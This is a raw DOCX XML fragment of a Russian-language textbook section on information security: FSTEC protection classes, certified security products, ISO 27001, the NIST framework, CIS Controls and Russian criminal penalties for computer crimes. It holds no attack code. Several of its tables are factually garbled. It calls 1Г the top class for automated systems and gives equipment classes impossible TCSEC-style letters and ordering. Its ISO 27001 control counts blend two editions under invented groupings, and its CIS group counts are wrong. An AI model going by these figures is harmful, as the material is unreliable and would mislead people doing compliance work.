        <w:t>Зачем нужны критерии?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Чтобы объективно оценить, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>насколько безопасна система</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Например, банк должен использовать системы </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>класса защиты КС1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (самый высокий), а интернет-магазин — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>КС3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (средний).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Классы защищённости АС (автоматизированных систем)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Приказ ФСТЭК №17 (2013)</w:t>
      </w:r>
      <w:r>
        <w:t>: Классификация АС по требованиям защиты информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5 классов защищённости</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Класс | Тип данных | Угрозы | Меры защиты |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-------|------------|--------|-------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1Г</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Государственная тайна, высший класс) | Гостайна особой важности | APT, инсайдеры | Сертифицированная криптография (ГОСТ), физическая изоляция, контроль целостности |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1Д</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Гостайна (совершенно секретно) | APT, инсайдеры | Криптография, IDS/IPS, SIEM, биометрия |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1К</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Гостайна (секретно) | Внешние атаки | Криптография, firewall, VPN |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2Б</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Конфиденциальная информация) | ПДн, коммерческая тайна, банковская тайна | Хакеры, конкуренты | Шифрование, разграничение доступа, антивирус, резервное копирование |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3А</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Общедоступная информация) | Публичные сайты, форумы | DDoS, дефейс | Базовая защита (firewall, HTTPS, rate limiting) |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Банк** (хранит данные клиентов, транзакции) → класс **2Б** или **1К**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Минобороны** (гостайна) → класс **1Г**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Интернет-магазин** (ПДн покупателей) → класс **2Б** или **3А**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Классы защищённости СВТ (средств вычислительной техники)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>СВТ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это компьютеры, серверы, рабочие станции.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>7 классов защищённости</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (от самого низкого к самому высокому):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Класс | Требования | Применение |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-------|------------|------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Д</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (самый низкий) | Дискреционное разграничение доступа (DAC) | Обычные ПК |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Г2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | + Идентификация и аутентификация | Офисные компьютеры |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Г1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | + Регистрация событий (логи) | Серверы в офисах |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | + Мандатное разграничение доступа (MAC), метки конфиденциальности | Государственные организации |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | + Контроль целостности | Банки, медицина |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>А2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | + Верификация механизмов защиты (доказательство корректности) | Военные системы |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>А1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (самый высокий) | + Формальное доказательство безопасности | Ядерные объекты, спецслужбы |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>банкоматах</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> используются СВТ класса </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (разграничение доступа + целостность ПО).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Сертификация средств защиты информации (СЗИ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>СЗИ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это антивирусы, firewall, SIEM, криптография, системы контроля доступа (биометрия, турникеты).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем сертификация?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Чтобы государство </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>доверяло</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> этим средствам. Например, для защиты гостайны можно использовать только </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сертифицированные ФСТЭК</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> криптосистемы (ГОСТ Р 34.10, 34.11).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры сертифицированных СЗИ</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Криптография**: КриптоПро CSP (ГОСТ), ViPNet (шифрование каналов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Антивирусы**: Kaspersky, Dr.Web (есть сертификаты ФСТЭК)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Firewall**: UserGate, С-Терра (российские)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SIEM**: MaxPatrol SIEM, R-Vision SIEM</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Импортозамещение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: После 2022 года в госсекторе активно переходят на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>российские</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> СЗИ (запрет на зарубежные).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.7.4. Стандарты информационной безопасности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ISO/IEC 27001 — международный стандарт ISMS (Information Security Management System)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Стандарт </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>управления информационной безопасностью</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Описывает, как построить </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>систему ИБ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в компании (политики, процессы, контроли).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура ISO 27001</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Context of the organization** (контекст организации): понять, кто мы, какие угрозы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Leadership** (лидерство): руководство должно **поддерживать** ИБ (выделять бюджет, назначить CISO)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Planning** (планирование): оценка рисков, выбор контролей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Support** (поддержка): обучение сотрудников, выделение ресурсов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Operation** (эксплуатация): внедрение контролей (firewall, шифрование, DLP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Performance evaluation** (оценка эффективности): аудит, метрики (сколько инцидентов, время реакции)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Improvement** (улучшение): исправление недостатков</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>114 контролей</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Annex A):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Organizational** (37): политика безопасности, управление рисками, обучение персонала</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**People** (8): проверка сотрудников (background check), NDA, обучение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Physical** (14): физическая защита (закрытые серверные, видеонаблюдение, контроль доступа)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Technological** (34): криптография, антивирус, firewall, резервное копирование, SIEM, патчинг</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Supplier** (11): безопасность цепи поставок (чтобы не было **SolarWinds**)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Incident Management** (7): реагирование на инциденты, форензика</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Business Continuity** (4): disaster recovery, резервные серверы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сертификация ISO 27001</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Компания может пройти </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>аудит</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (внешний аудитор проверяет соответствие стандарту) и получить </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сертификат</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на 3 года (потом ресертификация).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем сертификация?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Доверие клиентов** (банк с сертификатом ISO 27001 вызывает больше доверия)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Требование партнёров** (Google/Amazon требуют ISO 27001 от подрядчиков)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Конкурентное преимущество**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: У </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Google Cloud</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AWS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Microsoft Azure</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> есть сертификат ISO 27001.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>NIST Cybersecurity Framework (США)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Разработан NIST (National Institute of Standards and Technology)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — правительственное агентство США.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5 функций</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (циклический процесс):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Identify** (Идентифицировать): инвентаризация активов, оценка рисков</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие у нас данные? Где хранятся? Какие угрозы?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Protect** (Защитить): внедрение контролей (криптография, разграничение доступа, патчинг)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Detect** (Обнаружить): мониторинг (SIEM, IDS/IPS, анализ логов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Respond** (Реагировать): реагирование на инциденты (изоляция заражённых систем, форензика)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Recover** (Восстановить): восстановление после атаки (резервное копирование, disaster recovery)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример использования</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Colonial Pipeline (нефтепровод, атакован в 2021) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не имел</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> адекватного плана </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Respond</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Recover</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> → пришлось платить вымогателям $4.4 млн и останавливать pipeline на неделю.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>CIS Controls (Center for Internet Security)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>18 критичных контролей безопасности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (приоритизированные, самые важные сверху):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Implementation Groups</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (по размеру компании):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IG1** (малый бизнес, &lt; 100 сотрудников): 56 контролей (базовые)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IG2** (средний, 100-1000): 74 контроля</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IG3** (крупный, &gt; 1000): все 153 контроля</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Топ-5 контролей CIS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (самые важные):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Inventory and Control of Enterprise Assets** (инвентаризация активов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нельзя защитить то, о чём не знаешь</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Inventory and Control of Software Assets** (инвентаризация софта)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие программы установлены? Лицензированы? Обновлены?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Data Protection** (защита данных)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Шифрование, резервное копирование, классификация (публичные/конфиденциальные)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Secure Configuration** (безопасная конфигурация)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Отключить дефолтные пароли, ненужные сервисы, открытые порты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Account Management** (управление учётными записями)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>MFA, принцип наименьших привилегий, удаление неактивных аккаунтов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.7.5. Ответственность за нарушения в области ИБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Уголовная ответственность (Россия)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Статья УК РФ | Преступление | Наказание |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|--------------|--------------|-----------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>272</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Неправомерный доступ к компьютерной информации | До </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>7 лет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (группой лиц с тяжкими последствиями) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>273</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Создание/распространение вредоносных программ | До </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>7 лет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>274</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Нарушение правил эксплуатации (админ не обновил систему) | До </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5 лет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>274.1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Неправомерное воздействие на КИИ | До </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>10 лет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (с тяжкими последствиями) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>159.6</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Мошенничество в сфере компьютерной информации | До </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>10 лет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В 2021 году </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>хакера из Омска</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> осудили на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5 лет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (реальный срок) за взлом интернет-магазинов и кражу данных банковских карт (ст. 272, 273 УК РФ).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
